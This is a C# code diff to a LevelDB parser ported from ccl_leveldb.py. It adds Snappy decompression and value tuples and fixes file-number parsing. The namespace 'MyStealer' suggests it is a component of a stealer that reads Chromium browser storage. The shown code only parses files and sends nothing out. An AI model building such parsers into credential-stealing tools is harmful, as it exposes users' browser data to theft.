@@ -28,6 +28,9 @@ using System.Globalization;
 using System.Text.RegularExpressions;
 using System.Text;
 using MyStealer.Handler.Chromium.LevelDb;
+using Serilog;
+using Snappy;
+using System.Runtime.Remoting.Messaging;
 
 /// <summary>
 /// Ported from ccl_leveldb.py using pytocs 2.0.0-3150cbcd42
@@ -39,7 +42,7 @@ using MyStealer.Handler.Chromium.LevelDb;
 /// </summary>
 public static class CclLevelDb
 {
-    public static Tuple<int, byte[]> _read_le_varint(Stream stream, bool is_google_32bit = false)
+    public static (int, byte[]) _read_le_varint(Stream stream, bool is_google_32bit = false)
     {
         // this only outputs unsigned
         var i = 0;
@@ -50,21 +53,21 @@ public static class CclLevelDb
         {
             var raw = stream.ReadByte();
             if (raw < 0)
-                return null;
+                return (0, Array.Empty<byte>());
             underlying_bytes.Add((byte)raw);
             result |= (raw & 0x7f) << i * 7;
             if ((raw & 0x80) == 0)
                 break;
             i++;
         }
-        return Tuple.Create(result, underlying_bytes.ToArray());
+        return (result, underlying_bytes.ToArray());
     }
 
     // Convenience version of _read_le_varint that only returns the value or None (if None, return 0)
     public static int read_le_varint(Stream stream, bool is_google_32bit = false)
     {
         var x = _read_le_varint(stream, is_google_32bit: is_google_32bit);
-        return x is null ? 0 : x.Item1;
+        return x.Item1;
     }
 
     // Reads a blob of data which is prefixed with a varint length
@@ -285,7 +288,7 @@ public static class CclLevelDb
     public class LdbFile : DataFile
     {
 
-        public Tuple<byte[], BlockHandle>[] _index;
+        public (byte[], BlockHandle)[] _index;
 
         public BlockHandle _index_handle;
 
@@ -304,7 +307,7 @@ public static class CclLevelDb
                 throw new FileNotFoundException(file);
             }
             path = file;
-            file_no = int.Parse(Path.GetFileName(file), NumberStyles.HexNumber);
+            file_no = int.Parse(Path.GetFileNameWithoutExtension(file), NumberStyles.HexNumber);
             _f = File.Open(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
             _f.Seek(-FOOTER_SIZE, SeekOrigin.End);
             _meta_index_handle = BlockHandle.from_stream(_f);
@@ -336,21 +339,23 @@ public static class CclLevelDb
             var is_compressed = trailer[0] != 0;
             if (is_compressed)
             {
-                using (var buff = new MemoryStream(raw_block))
-                {
-                    // TODO: raw_block = ccl_simplesnappy.decompress(buff);
-                }
+                var buffer = new byte[SnappyCodec.GetUncompressedLength(raw_block, 0, raw_block.Length)];
+                var written = SnappyCodec.Uncompress(raw_block, 0, raw_block.Length, buffer, 0);
+                if (written != buffer.Length)
+                    throw new Exception("Snappy decompression length mismatched");
+
+                raw_block = buffer;
             }
             return new Block(raw_block, is_compressed, this, handle.offset);
         }
 
-        public virtual Tuple<byte[], BlockHandle>[] _read_index()
+        public virtual (byte[], BlockHandle)[] _read_index()
         {
             var index_block = _read_block(_index_handle);
 
             // key is earliest key, value is BlockHandle to that data block
             return (from entry in index_block
-                    select Tuple.Create(entry.key, BlockHandle.from_bytes(entry.value))).ToArray();
+                    select (entry.key, BlockHandle.from_bytes(entry.value))).ToArray();
         }
 
         // Iterate Records in this Table file
@@ -407,7 +412,7 @@ public static class CclLevelDb
             if (!File.Exists(file))
                 throw new FileNotFoundException(file);
             path = file;
-            file_no = int.Parse(Path.GetFileName(file), NumberStyles.HexNumber);
+            file_no = int.Parse(Path.GetFileNameWithoutExtension(file), NumberStyles.HexNumber);
             _f = File.Open(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
         }
 
@@ -415,13 +420,13 @@ public static class CclLevelDb
         {
             byte[] chunk;
             _f.Seek(0, SeekOrigin.Begin);
-            while ((chunk = _f.ReadBytes(LOG_BLOCK_SIZE)) != null)
+            while ((chunk = _f.ReadBytes(LOG_BLOCK_SIZE)).Length == LogFile.LOG_BLOCK_SIZE)
             {
                 yield return chunk;
             }
         }
 
-        public virtual IEnumerable<Tuple<long, byte[]>> _get_batches()
+        public virtual IEnumerable<(long, byte[])> _get_batches()
         {
             var in_record = false;
             var start_block_offset = 0L;
@@ -434,13 +439,16 @@ public static class CclLevelDb
                 {
                     while (buff.Position < LOG_BLOCK_SIZE - 6)
                     {
-                        //var header = buff.ReadBytes(7);
-                        //if (header.Length < 7)
-                        //    break;
+                        var header = buff.ReadBytes(7);
+                        if (header.Length < 7)
+                            break;
                         // (crc, length, block_type) = @struct.unpack("<IHB", header);
-                        var crc = buff.ReadLeUInt32();
-                        var length = buff.ReadLeUInt16();
-                        var block_type = (LogEntryType)buff.ReadByte();
+                        if (chunk.Length - buff.Position < 8)
+                            break;
+
+                        var crc = header.ToLeUInt32();
+                        var length = header.ToLeUInt16(4);
+                        var block_type = (LogEntryType)header[6];
 
                         if (block_type == LogEntryType.Full)
                         {
@@ -448,7 +456,7 @@ public static class CclLevelDb
                                 throw new Exception($"Full block whilst still building a block at offset {idx * LogFile.LOG_BLOCK_SIZE + buff.Position} in {path}");
 
                             in_record = false;
-                            yield return Tuple.Create(idx * LogFile.LOG_BLOCK_SIZE + buff.Position, buff.ReadBytes(length));
+                            yield return (idx * LogFile.LOG_BLOCK_SIZE + buff.Position, buff.ReadBytes(length));
                         }
                         else if (block_type == LogEntryType.First)
                         {
@@ -473,11 +481,12 @@ public static class CclLevelDb
 
                             block.Append(buff.ReadBytes(length));
                             in_record = false;
-                            yield return Tuple.Create(start_block_offset * LogFile.LOG_BLOCK_SIZE, block);
+                            yield return (start_block_offset * LogFile.LOG_BLOCK_SIZE, block);
                         }
                         else
                         {
-                            throw new Exception("Unexpected block type: " + block_type);
+                            yield break;
+                            //throw new Exception("Unexpected block type: " + block_type);
                         }
                     }
                 }
@@ -702,11 +711,11 @@ public static class CclLevelDb
 
         public ManifestFile(string path)
         {
-            var fileName = Path.GetFileName(path);
+            var fileName = Path.GetFileNameWithoutExtension(path);
             Match match;
             if ((match = MANIFEST_FILENAME_PATTERN.Match(fileName)) != null)
             {
-                file_no = int.Parse(match.Groups[0].Value, NumberStyles.HexNumber);
+                file_no = int.Parse(match.Groups[1].Value, NumberStyles.HexNumber);
             }
             else
             {
@@ -727,14 +736,12 @@ public static class CclLevelDb
         {
             byte[] chunk;
             _f.Seek(0, SeekOrigin.Begin);
-            while ((chunk = _f.ReadBytes(LogFile.LOG_BLOCK_SIZE)) != null)
-            {
+            while ((chunk = _f.ReadBytes(LogFile.LOG_BLOCK_SIZE)).Length == LogFile.LOG_BLOCK_SIZE)
                 yield return chunk;
-            }
         }
 
         // todo: it is duplicate with `LogFile`'s `_get_batches()`
-        public virtual IEnumerable<Tuple<long, byte[]>> _get_batches()
+        public virtual IEnumerable<(long, byte[])> _get_batches()
         {
             var in_record = false;
             var start_block_offset = 0L;
@@ -747,15 +754,14 @@ public static class CclLevelDb
                 {
                     while (buff.Position < LogFile.LOG_BLOCK_SIZE - 6)
                     {
-                        //header = buff.read(7);
-                        //if (header.Count < 7)
-                        //{
-                        //    break;
-                        //}
+                        var header = buff.ReadBytes(7);
+                        if (header.Length < 7)
+                            break;
                         //(crc, length, block_type) = @struct.unpack("<IHB", header);
-                        var crc = buff.ReadLeUInt32();
-                        var length = buff.ReadLeUInt16();
-                        var block_type = (LogEntryType)buff.ReadByte();
+
+                        var crc = header.ToLeUInt32();
+                        var length = header.ToLeUInt16(4);
+                        var block_type = (LogEntryType)header[6];
 
                         if (block_type == LogEntryType.Full)
                         {
@@ -763,7 +769,7 @@ public static class CclLevelDb
                                 throw new Exception("Full block whilst still building a block at offset {idx * LogFile.LOG_BLOCK_SIZE + buff.tell()} in {self.path}");
 
                             in_record = false;
-                            yield return Tuple.Create(idx * LogFile.LOG_BLOCK_SIZE + buff.Position, buff.ReadBytes(length));
+                            yield return (idx * LogFile.LOG_BLOCK_SIZE + buff.Position, buff.ReadBytes(length));
                         }
                         else if (block_type == LogEntryType.First)
                         {
@@ -788,11 +794,12 @@ public static class CclLevelDb
 
                             block.Append(buff.ReadBytes(length));
                             in_record = false;
-                            yield return Tuple.Create(start_block_offset * LogFile.LOG_BLOCK_SIZE, block);
+                            yield return (start_block_offset * LogFile.LOG_BLOCK_SIZE, block);
                         }
                         else
                         {
-                            throw new Exception("Unexpected block type: " + block_type);
+                            yield break;
+                            //throw new Exception("Unexpected block type: " + block_type);
                         }
                     }
                 }
@@ -834,7 +841,7 @@ public static class CclLevelDb
 
             _files = new List<DataFile>();
 
-            var latest_manifest = Tuple.Create<int, string>(0, null);
+            var latest_manifest = (0, "");
             foreach (var file in Directory.EnumerateFiles(in_dir, "*", SearchOption.TopDirectoryOnly))
             {
                 var fileName = Path.GetFileName(file);
@@ -854,9 +861,9 @@ public static class CclLevelDb
                 var manifestMatch = ManifestFile.MANIFEST_FILENAME_PATTERN.Match(fileName);
                 if (manifestMatch.Success)
                 {
-                    var manifest_no = int.Parse(manifestMatch.Groups[0].Value, NumberStyles.HexNumber);
+                    var manifest_no = int.Parse(manifestMatch.Groups[1].Value, NumberStyles.HexNumber);
                     if (latest_manifest.Item1 < manifest_no)
-                        latest_manifest = Tuple.Create(manifest_no, file);
+                        latest_manifest = (manifest_no, file);
                 }
             }
 
